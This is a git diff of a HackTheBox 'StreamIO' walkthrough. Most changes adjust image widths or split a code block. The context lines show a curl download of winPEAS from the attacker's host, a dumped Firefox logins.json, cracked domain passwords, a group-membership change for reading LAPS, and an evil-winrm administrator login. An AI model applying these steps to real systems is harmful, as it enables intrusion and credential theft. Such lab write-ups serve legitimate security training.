@@ -727,7 +727,7 @@ Once we send the request, we get the revshell:
 Checking the users in the machine, we can see the nikk37:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/3_1_users.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/3_1_users.png" width="60%"/>
 </p>
 
 Going back to the enumerated assets, I checked the unused database credentials that we found in the php code and probably the database will be Microsoft SQL, therefore the service might be running on the default port 1433. Since we cannot list the ports used (due to the low priviledges of this user), I will use port forwarding with chisel se I can access to the sql server from my machine.
@@ -763,13 +763,13 @@ SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
 Master db has the same users that we obtained from the SQLi
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/5_2_master_db.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_2_master_db.png" width="50%"/>
 </p>
 
 But in the backup one we can see our target user:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/5_3_backup_db.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_2_backup_db.png" width="50%"/>
 </p>
 
 
@@ -838,7 +838,7 @@ curl http://10.10.14.132:5454/Windows/winPEASany.exe -o win.exe
 We can see that there is a Firefox credential file, let's download it to check it on local:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/7_0_firefox.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/7_0_firefox.png" width="90%"/>
 </p>
 
 
@@ -850,8 +850,11 @@ We can see that there is a Firefox credential file, let's download it to check i
 
 We will also need the logins.json file and the complete ini folder for the tool we are using:
 
-```json
+```bash
 *Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> type logins.json
+```
+
+```json
 {"nextId":5,"logins":[{"id":1,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECG2cZGM1+s+hBAiQvduUzZPkCw==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECKA5q3v2TxvuBBjtXIyW2UjOBvrg700JOU1yfrb0EnMRelw=","guid":"{9867a888-c468-4173-b2f4-329a1ec7fa60}","encType":1,"timeCreated":1645526456872,"timeLastUsed":1645526456872,"timePasswordChanged":1645526456872,"timesUsed":1},{"id":2,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDMUru7zbEb0BAiinvqXr8Trkg==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECOXW0KzZftfWBBARYsMPvSrUwx8+QfJdxzT+","guid":"{739bd2a5-5fec-4e08-97d2-3c619bf02be2}","encType":1,"timeCreated":1645526470377,"timeLastUsed":1645526470377,"timePasswordChanged":1645526470377,"timesUsed":1},{"id":3,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPtpFUOBoOFABBDVCjdAdstUxzB6i9DCqvOw","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCocciyfDsthBBDm3YSuhBsW3roo3l3zOUuF","guid":"{a98a87bc-86aa-489c-9227-d6579ab5148b}","encType":1,"timeCreated":1645526484137,"timeLastUsed":1645526484137,"timePasswordChanged":1645526484137,"timesUsed":1},{"id":4,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECB1j+gQdXzIuBAgO0o/N3J2MrQ==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNt9zddW+/h7BBCBgoQVGaDQjF2IpeQEl/Td","guid":"{2be21548-7c50-42f0-8ef6-b33b1e77f150}","encType":1,"timeCreated":1645526511842,"timeLastUsed":1645526511842,"timePasswordChanged":1645526511842,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
 ```
 
@@ -890,7 +893,7 @@ Password: 'password@12'
 We got many credentials, let's test them with crackmapexec:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/7_1_new_users.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/7_1_new_users.png" width="90%"/>
 </p>
 
 
@@ -906,7 +909,7 @@ We have that the crads **JDgodd:JDg0dd1s@d0p3cr3@t0r** are valid on smb, no pwne
 Once we have marked the users we owner, let's check the shortest path from each of them:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/8_1_bloodjdgod.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/8_1_bloodjdgod.png" width="80%"/>
 </p>
 
 The most obvious priv esc path is with user JDgodd since it has Read LAPS passwords over the DC. Looking for information about the attack, I found [this website](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) and a tool called [LAPSDumper](https://github.com/n00py/LAPSDumper). With crackmapexec could not login with any of the password for the JDgodd user.
@@ -929,7 +932,7 @@ Add-DomainGroupMember -Identity 'Core Staff' -Members nikk37 -Credential $Cred
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/8_2_added.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/8_2_added.png" width="95%"/>
 </p>
 
 
@@ -950,7 +953,7 @@ LAPS        10.10.11.158    389    DC               Computer: DC$               
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/9_0_cme.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/9_0_cme.png" width="95%"/>
 </p>
 
 
@@ -967,7 +970,7 @@ evil-winrm -i 10.10.11.158 -u administrator -p ',-96;;;dIO7dQ/'
 And the flag is on the Martin user:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/streamio/9_2_martin.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/9_2_martin.png" width="70%"/>
 </p>
 
 
